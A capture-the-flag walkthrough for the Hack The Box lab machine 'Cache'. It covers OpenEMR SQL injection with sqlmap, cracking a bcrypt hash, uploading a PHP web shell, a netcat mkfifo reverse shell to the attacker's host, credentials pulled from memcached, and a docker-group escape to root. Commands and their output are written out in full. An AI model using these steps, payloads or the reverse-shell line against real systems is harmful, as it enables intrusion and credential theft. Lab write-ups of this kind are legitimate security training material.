# Cache @ 10.10.10.188

## Enumeration

nmap shows that a webserver is running on port 80.

```bash
$ nmap -sV 10.10.10.188
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

Checking the source code of all the login page reveals credentials in `funtionality.js`

```js
function checkCorrectPassword(){
    var Password = $("#password").val();
    if(Password != 'H@v3_fun'){
        alert("Password didn't Match");
        error_correctPassword = true;
    }
}
function checkCorrectUsername(){
    var Username = $("#username").val();
    if(Username != "ash"){
        alert("Username didn't Match");
        error_username = true;
    }
}
```

> User: `ash` \
> Pass: `H@v3_fun`

Logging in with those credentials does not result in more data.

Further browsing to the site reveals on the author page <http://10.10.10.188/author.html> that there might be another site

> Check out his other projects like Cache: \
> HMS(Hospital Management System) 

Fuzz for other virtual hosts using information from the site:

```bash
$ cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.188/author.html
$ wfuzz -w wordlist.txt -H "HOST: FUZZ.htb" -u http://10.10.10.188/ --hc 400 --hh 8193
000000037:   302        0 L      0 W      0 Ch        "HMS"
``` 

The site hms.htb is available. Add it to `/etc/hosts`. Browsing to the site shows the log in page of OpenEMR. 

## Exploitation

The OpenEMR is vulnerable to SQL injection, after some registration steps as shown in <https://www.youtube.com/watch?v=DJSQ8Pk_7hc>.

1. Go to http://hms.htb/portal/add_edit_event_user.php
2. Click register
3. Register account admin
4. The registration will fail, wait for the popup
5. Go to http://hms.htb/portal/add_edit_event_user.php?eid=1' and send the request through burp

```bash
GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
Host: hms.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: OpenEMR=deqfe1itgn2dcp33ba79lb1eed; PHPSESSID=eg5i1t7p2m4uvoogp2v9rmos1i
Upgrade-Insecure-Requests: 1
```

6. Save the request to file and feed the request to SQLmap

```bash
$ sqlmap -r req.txt --threads=10 --dbs
$ sqlmap-r req.txt --threads=10 -D openemr --tables
$ sqlmap-r req.txt --threads=10 -D openemr -T users_secure --dump
...
+------+--------------------------------+---------------+--------------------------------------------------------------+
| id   | salt                           | username      | password                                                     |
+------+--------------------------------+---------------+--------------------------------------------------------------+
| 1    | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. |
+------+--------------------------------+---------------+--------------------------------------------------------------+
```

A password hash for user `openemr_admin`. Save it to a file and feed it to john

```bash
$ cat hash.txt 
$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.

$ sudo john -w=/home/kali/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxx           (?)
1g 0:00:00:01 DONE (2020-06-21 07:39) 0.9523g/s 805.7p/s 805.7c/s 805.7C/s tristan..princesita
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

> User: `openemr_admin` \
> Pass: `xxxxxx`

Log in using the username and password. The interface allows for uploading files to the webserver at Administration > Files. Upload a shell.php file containing p0wnyshell <https://github.com/flozz/p0wny-shell> using the image upload feature. There will be no confirmation, but the file should upload to `sites/default/images`. After uploading, access http://hms.htb/sites/default/images/shell.php to access the uploaded p0wnyshell. 

After confirming that nc is present using `which nc`, start a reverse shell from the web shell and upgrade to an interactive shell.

```bash
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4444 >/tmp/f
```

```bash
$ nc -nlvp 4444               
listening on [any] 4444 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.188] 54358
/bin/sh: 0: can't access tty; job control turned off
$ whoami && hostname
www-data
cache
$ python3 -c "__import__('pty').spawn('/bin/bash')"
www-data@cache:/var/www/hms.htb/public_html/sites/default/images$ 
```

Listing the home folder shows users ash and luffy. Use the obtained credentials from the login page to change to user ash.

```bash
www-data@cache:/$ ls -la /home 
ls -la /home
total 16
drwxr-xr-x  4 root  root  4096 Sep 17  2019 .
drwxr-xr-x 23 root  root  4096 Jul  9  2020 ..
drwxr-xr-x 12 ash   ash   4096 Mar 27 17:11 ash
drwxr-x---  5 luffy luffy 4096 Sep 16  2020 luffy

www-data@cache:/home$ su ash
Password: H@v3_fun

ash@cache:/home$ cd ash
ash@cache:~$ cat user.txt
```

## Further enumeration

Netstat shows that something is listening on port 11211

```bash
ash@cache:~$ netstat -antup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
tcp        0    300 10.10.10.188:54358      10.10.14.16:4444        ESTABLISHED -                   
tcp        0      1 10.10.10.188:39626      8.8.4.4:53              SYN_SENT    -                   
tcp        0      0 127.0.0.1:11211         127.0.0.1:60474         TIME_WAIT   -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 10.10.10.188:80         10.10.14.16:46348       ESTABLISHED -                   
udp        0      0 127.0.0.1:48521         127.0.0.53:53           ESTABLISHED -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
ash@cache:~$ 
```

Running `ps` it becomes clear that memcached is running on port 11211

```
ash@cache:/$  ps fauxwww | grep 11211         
memcache  1085  0.0  0.1 425792  4112 ?        Ssl  15:56   0:01 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
ash       3157  0.0  0.0  13136  1056 pts/1    S+   18:59   0:00  |       |                   \_ grep --color=auto 11211
ash@cache:/$ 
```

Access the memcached server using nc and dump the cache.

```bash
ash@cache:/$ nc 127.0.0.1 11211
nc 127.0.0.1 11211
version

VERSION 1.5.6 Ubuntu

stats cachedump 1 0           

ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END
```

It contains user and password info. Access those using the get command

```bash
get link 
VALUE link 0 21
https://hackthebox.eu
END

get user
VALUE user 0 5
luffy
END

get passwd
VALUE passwd 0 9
0n3_p1ec3
END

get file
VALUE file 0 7
nothing
END

get account
VALUE account 0 9
afhj556uo
END
```

> User: luffy\
> Pass: 0n3_p1ec3

`id luffy` shows that luffy is a member of the docker group. That might be usefull. Change to user luffy with the obtained password.

```bash
ash@cache:/$ su luffy
su luffy
Password: 0n3_p1ec3

luffy@cache:/$ 
```

Use docker to mount the root image using <https://gtfobins.github.io/gtfobins/docker/>. First list the availabe images. Use an image to start a interactive container with the root folder mounted.

```bash
luffy@cache:/$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        18 months ago       64.2MB

luffy@cache:/$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)

# cd root

# ls
root.txt

# cat root.txt
```
